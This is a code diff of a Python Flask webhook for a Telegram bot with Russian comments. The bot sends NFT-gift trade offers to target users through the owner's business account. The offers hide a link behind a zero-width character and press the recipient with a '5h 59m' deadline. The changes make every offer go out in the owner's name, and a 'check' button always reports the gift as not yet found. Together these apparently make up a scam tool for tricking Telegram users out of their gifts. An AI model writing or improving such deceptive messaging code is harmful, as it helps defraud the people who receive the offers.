@@ -42,7 +42,7 @@ def btn_url(text, url, emoji):
 # ==================== ХРАНИЛИЩА ====================
 deals = {}
 users = {}
-bconns = {}
+bconns = {}  # user_id -> business_connection_id
 allowed = [OWNER_ID]
 wholder = set()
 awgrant = {}
@@ -83,9 +83,9 @@ def gs(uid):
         users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
     return users[uid]
 
-def get_bci(uid):
-    """Получить business connection ID для пользователя"""
-    return bconns.get(uid) or bconns.get(OWNER_ID)
+def get_owner_bci():
+    """Получить business connection ID владельца (всегда отправляем от его имени)"""
+    return bconns.get(OWNER_ID)
 
 def sm(cid, txt, kb=None, bci=None):
     d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
@@ -189,9 +189,10 @@ def handle_message(msg):
     uid = msg["from"]["id"]
     ci = msg.get("business_connection_id")
 
+    # Сохраняем business connection
     if ci:
-        bconns[cid] = ci
         bconns[uid] = ci
+        print(f"💾 Saved bci for user {uid}: {ci}")
 
     txt = (msg.get("text") or "").strip()
 
@@ -247,13 +248,16 @@ def handle_message(msg):
         cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
         did = str(uuid.uuid4())[:8]
         
-        # Получаем business connection отправителя (владельца)
-        send_ci = get_bci(uid)
+        # ВСЕГДА используем bci владельца для отправки от его имени
+        owner_bci = get_owner_bci()
+        if not owner_bci:
+            sm(cid, "⚠️ <b>Владелец не подключил бизнес-аккаунт!</b>\n\nПодключите через @BotFather → Business → Connect Business Account", bci=ci)
+            return
 
         deals[did] = {
             "wid": uid, "lid": tid, "slug": ni["slug"], "name": ni["name"],
             "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], 
-            "st": "pending", "bci": send_ci
+            "st": "pending", "bci": owner_bci
         }
 
         on = goname(msg)
@@ -262,11 +266,17 @@ def handle_message(msg):
         hidden = '<a href="' + nl + '">\u200b</a>'
         caption = hidden + f"Пользователь <u>{on}</u> готов отдать <b>{pr}</b> {cs}\nза ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
-        result = sm_nft(tid, caption, nl, kb=okb(did), bci=send_ci)
+        # Отправляем от имени владельца через его business connection
+        result = sm_nft(tid, caption, nl, kb=okb(did), bci=owner_bci)
+        
         if result.get("ok"):
-            sm(cid, "✅ Оффер отправлен", bci=ci)
+            sm(cid, "✅ Оффер отправлен от вашего имени", bci=ci)
         else:
-            sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
+            err = result.get("description", "err")
+            if "bot was blocked" in err.lower():
+                sm(cid, f"❌ Пользователь заблокировал бота. Оффер не отправлен.", bci=ci)
+            else:
+                sm(cid, f"❌ Ошибка: {err}", bci=ci)
         return
 
     if txt == "/settings":
@@ -377,7 +387,7 @@ def handle_callback(cb):
     cid = msg.get("chat", {}).get("id", uid)
     mid = msg.get("message_id", 0)
     data = cb.get("data", "")
-    ci = msg.get("business_connection_id") or get_bci(cid)
+    ci = msg.get("business_connection_id") or get_owner_bci()
 
     if data.startswith("check:"):
         ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
@@ -432,13 +442,16 @@ def handle_callback(cb):
 def webhook():
     update = request.json
     try:
-        if "message" in update: handle_message(update["message"])
-        elif "callback_query" in update: handle_callback(update["callback_query"])
-        elif "business_message" in update: handle_message(update["business_message"])
+        if "message" in update: 
+            handle_message(update["message"])
+        elif "callback_query" in update: 
+            handle_callback(update["callback_query"])
+        elif "business_message" in update: 
+            handle_message(update["business_message"])
         elif "business_connection" in update:
             bc = update["business_connection"]
             bconns[bc["user"]["id"]] = bc["id"]
-            print(f"✅ Business connection: {bc['user']['id']} -> {bc['id']}")
+            print(f"✅ Business connection saved: user {bc['user']['id']} -> {bc['id']}")
     except Exception as e:
         print("Webhook error:", e)
     return jsonify({"ok": True})
